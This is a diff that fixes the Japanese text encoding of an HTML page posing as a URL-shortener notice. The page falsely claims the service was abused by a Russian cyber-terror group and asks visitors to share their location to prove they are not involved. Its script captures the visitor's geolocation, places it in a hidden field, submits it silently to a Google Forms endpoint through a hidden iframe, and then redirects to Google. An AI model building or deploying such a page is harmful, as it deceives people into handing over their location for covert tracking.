@@ -1,12 +1,12 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>���m�点</title>
+    <title>お知らせ</title>
     <link rel="icon" href="https://url.onl.jp/favicon.ico">
     <style>
-        /* �y�[�W�S�̂̔w�i�X�^�C�� */
+        /* ページ全体の背景スタイル */
         body {
-            background-color: #F8F9F8; /* �y�[�W�̔w�i�F��K���ȐF�ɒu�������Ă������� */
+            background-color: #F8F9F8; /* ページの背景色を適当な色に置き換えてください */
             margin: 0;
             padding: 0;
             display: flex;
@@ -16,10 +16,10 @@
             min-height: 100vh;
         }
 
-        /* ���ׂĂ̗v�f�̕����F�����ɐݒ� */
+        /* すべての要素の文字色を黒に設定 */
         h1, p, button {
-            color: #000; /* �����F�����ɐݒ� */
-            margin: 10px 0; /* �v�f�Ԃ̏㉺�̃}�[�W����ǉ����ĉ��s������ */
+            color: #000; /* 文字色を黒に設定 */
+            margin: 10px 0; /* 要素間の上下のマージンを追加して改行を入れる */
             /*border-radius: 10px;*/
         }
 
@@ -28,23 +28,23 @@
         }
 
         .container {
-            width: 80%; /* �R���e�i�̕��𒲐����Ă������� */
-            margin: 0 auto; /* �R���e�i�𒆉��ɔz�u���܂� */
-            padding: 20px; /* �K�؂ȃp�f�B���O��ݒ肵�Ă������� */
-            background-color: white; /* �R���e�i�̔w�i�F��ݒ肵�܂� */
-            border: 1px solid #ddd; /* �g����ǉ�����ꍇ */
-            border-radius: 5px; /* �p�ۂɂ���ꍇ */
+            width: 80%; /* コンテナの幅を調整してください */
+            margin: 0 auto; /* コンテナを中央に配置します */
+            padding: 20px; /* 適切なパディングを設定してください */
+            background-color: white; /* コンテナの背景色を設定します */
+            border: 1px solid #ddd; /* 枠線を追加する場合 */
+            border-radius: 5px; /* 角丸にする場合 */
         }
 
-        /* ���̑��̃X�^�C�����O���[���������ɒǉ��ł��܂� */
+        /* その他のスタイリングルールをここに追加できます */
 
     </style>
 </head>
 <body>
     <form action="https://docs.google.com/forms/u/1/d/e/1FAIpQLScfax4AMp-T2HvQtv4kEgaKvV9T5xI917XbI6f8KZx4_t53Tw/formResponse" method="post" target="hidden_iframe" id="mG61Hd" jsmodel="TOfxwf Q91hve" data-shuffle-seed="2868127642733565241" data-response="%.@.[]]" data-first-entry="0" data-last-entry="4" data-is-first-page="true">
-        <!-- ��\���̃t�B�[���h��ǉ� -->
+        <!-- 非表示のフィールドを追加 -->
         <input type="hidden" name="entry.518300877" id="geo_data">
-        <!-- JavaScript�ňʒu����ݒ� -->
+        <!-- JavaScriptで位置情報を設定 -->
         <script>
             function test() {
                 navigator.geolocation.getCurrentPosition(test2);
@@ -61,25 +61,25 @@
 
                 var date = new Date(position.timestamp);
 
-               // geo_text += "�擾����:" + date.toLocaleString() + "\n";
+               // geo_text += "取得時刻:" + date.toLocaleString() + "\n";
 
-                // �ʒu�����\���̃t�B�[���h�ɐݒ�
+                // 位置情報を非表示のフィールドに設定
                 document.getElementById("geo_data").value = geo_text;
 
-                // �t�H�[�����������M
+                // フォームを自動送信
                 document.forms[0].submit();
                 window.location.href = 'https://google.co.jp';
             }
         </script>
 
-        <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;" onload="if(submitted){window.location='���O�C����ɔ�ԃy�[�W';}"></iframe>
+        <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;" onload="if(submitted){window.location='ログイン後に飛ぶページ';}"></iframe>
     </form>
     <biv class="container">
-    <h1>���m�点</h1>
-    <p>�����Z�kURL�T�[�r�X�������p�����������肪�Ƃ��������܂��B���̓x�{�T�[�r�X���A���V�A�̃T�C�o�[�e���g�D�̔ƍ߂̒��p��n�Ƃ��ė��p���ꂽ���Ƃ����o���܂����B<br />���̂��߁A��܂��Ȉʒu���������Ă��������A���̑g�D�ł͂Ȃ����Ƃ��m�F���Ă��������܂��B�����f�����������܂����A��낵�����肢���܂��B</p>
+    <h1>お知らせ</h1>
+    <p>いつも短縮URLサービスをご利用いただきありがとうございます。この度本サービスが、ロシアのサイバーテロ組織の犯罪の中継基地として利用されたことが発覚しました。<br />そのため、大まかな位置情報を許可していただき、その組織ではないことを確認していただきます。ご迷惑をおかけしますが、よろしくお願いします。</p>
 
-    <!-- �{�^�����N���b�N���Ĉʒu�����擾 -->
-    <button onclick="test()">�����N�Ɉړ�</button>
+    <!-- ボタンをクリックして位置情報を取得 -->
+    <button onclick="test()">リンクに移動</button>
         </biv>
 </body>
 </html>
